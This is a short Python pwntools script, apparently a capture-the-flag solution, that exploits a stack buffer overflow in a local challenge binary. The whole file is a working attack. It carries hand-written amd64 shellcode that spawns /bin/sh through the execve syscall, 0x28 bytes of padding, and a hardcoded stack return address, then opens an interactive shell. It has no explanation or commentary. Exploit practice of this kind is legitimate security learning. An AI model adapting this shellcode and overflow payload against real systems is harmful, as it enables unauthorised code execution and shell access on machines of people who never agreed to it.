
from pwn import *

chal = ELF('./chal')

context.binary = chal

conn = process([chal.path])

def main():
    
    addr_shellcode = 0x7fffffffd840
    shellcode = asm('''
        .intel_syntax noprefix
        .global _start
    _start:
        xor rdx, rdx
        push rdx
        mov rax, 0x68732f6e69622f
        push rax 
        mov rdi, rsp
        push rdx
        push rdi 
        mov rsi, rsp 
        mov rax, 0x3b
        syscall
    ''', arch = 'amd64')

    payload = b'\0' * 0x20
    payload += p64(0)
    payload += p64(addr_shellcode)
    payload += shellcode
    
    conn.sendlineafter(b'Input: ', payload)
    conn.interactive()

if __name__ == '__main__':
    main()
